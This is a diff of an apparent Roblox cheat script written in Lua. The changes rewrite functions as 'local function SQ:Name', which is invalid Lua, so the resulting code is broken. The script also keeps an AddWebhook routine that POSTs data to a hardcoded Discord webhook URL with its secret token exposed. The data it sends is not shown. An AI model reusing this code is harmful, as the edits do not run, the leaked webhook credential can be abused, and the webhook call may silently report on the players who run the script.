@@ -70,7 +70,7 @@ end
 
 --functions
 
-function SQ:Destroy(StandName)
+local function SQ:Destroy(StandName)
 for i,v in pairs(chr.Stand:GetChildren()) do
 if v:IsA("LocalScript") then
 if v.Name == StandName then
@@ -82,7 +82,7 @@ end
 end
 end
 
-function SQ:RedesignGUI(TextHolder) -- This was made by King himself lmfao
+local function SQ:RedesignGUI(TextHolder) -- This was made by King himself lmfao
 local l1 = game.Players.LocalPlayer.PlayerGui.MenuGUI.Samurai
 local l2 = game.Players.LocalPlayer.PlayerGui.MenuGUI.Requiem
 
@@ -125,7 +125,7 @@ task.delay(0.5, function()
 end)
 end
 
-function SQ:AddWebhook()
+local function SQ:AddWebhook()
 local http_request = http_request;
 local http_request = http_request;
 local url = "https://discord.com/api/webhooks/1113840850145906759/BgDjmQgJmTEnZdLbju3aY7HCD6ehMlIto0r7xhA5bwkM3xoz5F0rU47ZY5QA2HViDd3r"
@@ -144,11 +144,11 @@ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 end
 
-function asset(ID)
+local function SQ:Asset(ID)
 return "rbxassetid://"..ID
 end
 
-function SQ:NewInstance(Item)
+local function SQ:NewInstance(Item)
 return Instance.new(Item)
 end
 end
